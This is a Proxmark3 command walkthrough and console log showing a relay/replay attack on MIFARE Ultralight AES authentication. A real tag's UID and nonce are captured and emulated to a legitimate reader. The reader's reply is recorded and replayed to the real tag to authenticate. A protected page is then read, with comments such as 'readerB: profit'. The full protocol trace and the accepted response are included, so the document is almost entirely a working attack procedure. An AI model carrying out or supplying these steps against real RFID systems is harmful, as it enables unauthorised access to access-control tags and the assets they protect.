```
# readerB: get UID
hf 14a read
# readerB: get nonce
hf 14a raw -sck 1a00

# readerA: emulate UID & nonce
hf mfu sim -u 04B266C2451390 -t 14 --1a1 C9C519124A2CF4797F253119BD56190D
# readerA: stop emulation and show reader reply
trace list -t 14a

# readerB: replay reply
hf 14a raw -ck AF 22D99B7682AF4E8BCDF2DCEF1760D5DAC779A3C98C5327AC16F7B580594A54D4
# readerB: profit
hf 14a raw -c a2 29 0000003c
```


```
[usb] pm3 --> hf 14a read
[+]  UID: 04 61 9C C2 45 13 90 
[+] ATQA: 00 44
[+]  SAK: 00 [2]

[usb] pm3 --> hf 14a raw -sck 1a00
[+] AF 23 93 06 F8 AA 66 F6 35 42 2C 02 D6 90 B7 47 A9 [ 22 FD ]

[usb] pm3 --> hf mfu sim -u 04619CC2451390 -t 14 --1a1 239306F8AA66F635422C02D690B747A9
[+] Emulating ISO/IEC 14443 type A tag with 7 byte UID (04 61 9C C2 45 13 90 )
[=] Press pm3 button to abort simulation
[#] UL-AES UID........ 
[#] 04 61 9c c2 45 13 90
[#] failed authentication
[#] failed authentication
[#] Emulator stopped. Trace length: 468 
[=] Done!
[usb] pm3 --> trace list -t 14a
[+] Recorded activity ( 468 bytes )
[=] start = start of start frame. end = end of frame. src = source of transfer.
[=] ISO14443A - all times are in carrier periods (1/13.56MHz)

      Start |        End | Src | Data (! denotes parity error)                                           | CRC | Annotation
------------+------------+-----+-------------------------------------------------------------------------+-----+--------------------
          0 |       1056 | Rdr |26(7)                                                                    |     | REQA
       2228 |       4596 | Tag |44  00                                                                   |     | 
      13150 |      15614 | Rdr |93  20                                                                   |     | ANTICOLL
      16786 |      22610 | Tag |88  04  61  9C  71                                                       |     | 
      44012 |      54476 | Rdr |93  70  88  04  61  9C  71  67  F6                                       |  ok | SELECT_UID
      55712 |      59232 | Tag |04  DA  17                                                               |  ok | 
      68346 |      70810 | Rdr |95  20                                                                   |     | ANTICOLL-2
      71918 |      77806 | Tag |C2  45  13  90  04                                                       |     | 
      99128 |     109656 | Rdr |95  70  C2  45  13  90  04  C6  91                                       |  ok | SELECT_UID-2
     110828 |     114412 | Tag |00  FE  51                                                               |  ok | 
     658342 |     663110 | Rdr |1A  00  41  76                                                           |  ok | AUTH-1 
     668506 |     690522 | Tag |AF  23  93  06  F8  AA  66  F6  35  42  2C  02  D6  90  B7  47  A9  22   |     | 
            |            |     |FD                                                                       |  ok | 
    7793244 |    7833724 | Rdr |AF  00  5F  38  93  01  25  EC  90  9A  1E  F5  D3  0B  EB  D1  C1  9C   |     | 
            |            |     |75  BC  1E  80  49  D7  C8  92  AE  7D  40  A5  37  87  17  F2  FB       |  ok | 
    7843600 |    7844240 | Tag |00(4)                                                                    |     | 
   37064100 |   37065156 | Rdr |26(7)                                                                    |     | REQA
   37066328 |   37068696 | Tag |44  00                                                                   |     | 
   37077378 |   37079842 | Rdr |93  20                                                                   |     | ANTICOLL
   37081014 |   37086838 | Tag |88  04  61  9C  71                                                       |     | 
   37108240 |   37118704 | Rdr |93  70  88  04  61  9C  71  67  F6                                       |  ok | SELECT_UID
   37119940 |   37123460 | Tag |04  DA  17                                                               |  ok | 
   37132638 |   37135102 | Rdr |95  20                                                                   |     | ANTICOLL-2
   37136274 |   37142162 | Tag |C2  45  13  90  04                                                       |     | 
   37163486 |   37174014 | Rdr |95  70  C2  45  13  90  04  C6  91                                       |  ok | SELECT_UID-2
   37175186 |   37178770 | Tag |00  FE  51                                                               |  ok | 
   37722490 |   37727258 | Rdr |1A  00  41  76                                                           |  ok | AUTH-1 
   37732590 |   37754606 | Tag |AF  23  93  06  F8  AA  66  F6  35  42  2C  02  D6  90  B7  47  A9  22   |     | 
            |            |     |FD                                                                       |  ok | 
   44857858 |   44898338 | Rdr |AF  FE  8A  C3  43  1B  16  F9  38  5F  F3  68  59  46  70  4D  33  C3   |     | 
            |            |     |62  DA  02  E1  37  02  C6  9A  3A  B0  07  F7  15  2F  B6  27  89       |  ok | 
   44908598 |   44909238 | Tag |00(4)                                                                    |     | 


[usb] pm3 --> hf 14a raw -ck AF FE8AC3431B16F9385FF3685946704D33C362DA02E13702C69A3AB007F7152FB6
[+] 00 7B EB F3 AB A4 1A AF 36 06 9F 9E B8 A3 EE 0F 56 [ 21 78 ]
```
